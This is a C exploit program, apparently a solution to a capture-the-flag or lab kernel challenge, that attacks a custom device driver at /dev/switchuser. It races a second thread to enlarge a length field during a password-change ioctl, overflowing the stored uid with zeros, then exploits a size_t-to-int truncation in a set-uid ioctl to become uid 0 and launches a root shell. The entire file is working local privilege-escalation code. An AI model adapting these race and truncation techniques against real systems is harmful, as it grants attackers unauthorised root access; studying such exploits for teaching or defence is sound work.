#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_FILE "/dev/switchuser"

#define SET_UID 0x1338
#define CHANGE_PASSWORD 0x1339

typedef struct {
    unsigned int len;
    char *password;
    size_t uid;
} ioctl_input;

void *change_data(void *arg) {
    usleep(18000); // msleep(10); - in line 52 in the code
    ioctl_input *input = (ioctl_input *)arg;
    input->len = 48;
    return NULL;
}

void change_password() {
    pthread_t tid;
    int device_fd;
    ioctl_input input;

    device_fd = open(DEVICE_FILE, O_RDWR);
    if (device_fd == -1) {
        perror("Failed to open the device file");
        exit(1);
    }

    input.len = 8;
    input.password = "password\0aaaaaaaaaaaaaaaaaaaaaaaaabbbbbb\0\0\0\0\0\0\0\0"; // overflow the uid with 0

    pthread_create(&tid, NULL, change_data, &input); // win the race
    if (ioctl(device_fd, CHANGE_PASSWORD, &input) == -1) {
        perror("Failed to change password");
        close(device_fd);
        exit(1);
    }
    close(device_fd);
}

void set_uid() {
    pthread_t tid;
    int device_fd;
    ioctl_input input;

    device_fd = open(DEVICE_FILE, O_RDWR);
    if (device_fd == -1) {
        perror("Failed to open the device file");
        exit(1);
    }

    input.len = 8;
    input.uid = 0x0100000000; // size_t (big number) <--> int (0)
    input.password = "password";

    if (ioctl(device_fd, SET_UID, &input) == -1) {
        perror("Failed to change set uid");
        close(device_fd);
        exit(1);
    }
    close(device_fd);

    execl("/bin/sh", "/bin/sh", NULL);
}

int main() {
    change_password();
    set_uid();

    return 0;
}
